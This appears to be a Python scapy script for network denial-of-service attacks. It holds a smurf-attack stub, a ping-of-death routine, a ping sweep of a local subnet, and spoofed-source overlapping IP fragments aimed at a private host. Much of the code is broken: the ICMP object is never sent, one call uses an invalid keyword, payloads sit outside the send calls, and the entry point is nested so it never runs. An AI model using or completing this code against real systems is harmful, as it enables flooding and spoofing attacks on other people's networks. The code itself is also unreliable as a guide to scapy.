#! /usr/bin/python
from scapy.layers.inet import ICMP, fragment, IP
from scapy.layers.l2 import Ether, ARP
import scapy.all as scapy
import time

from scapy.packet import Raw
from scapy.sendrecv import sr, send

def smurf_attack():
    #need to set both src and dst to broadcast with the 15000 bits length and send it as fast as possible
    scapy.layers.inet.ICMP(type = 8, code = 0, chksum = None, id = 0, seq = 0, ts_ori = 42889485, ts_rx = 42889485, ts_tx = 42889485, length = 15000, addr_mask = '0.0.0.0', nexthopmtu = 0, unused = None, extpad = b'', ext = None)
def ICMPAttacks():
    def thePingOfDeath():
        ans, unans = sr(IP(dst="192.168.1.0/24")/ICMP(), timeout=3)
        max_data_size = 65535
        #Overlapping packets may cause issues, or allow for security bypass, may also be good in another attack to boost its results
        send(IP(src="1.1.1.1", dst="192.168.208.131", id=20, flags=0x1, frag=0) / "OverlappingPacketAAAAAAAAAAAAAAAAAAA", count=1)
        send(IP(src="1.1.1.1", dst="192.168.208.131", id=20, flags=0x0, frag=1) / "FunTestAAAAAAAAAAAAAAAAAAAAAAAAA", count=1)
        send(IP(src = "", dest = "" , id=25, flags=0x1, frag =0)) / Raw(load="A" * 65528)
        send(IP(src="", dest="", id=30, flags=0x0, frag=8191)) / Raw(load="A" * max_data_size)
    if __name__ == '__main__':
        thePingOfDeath()
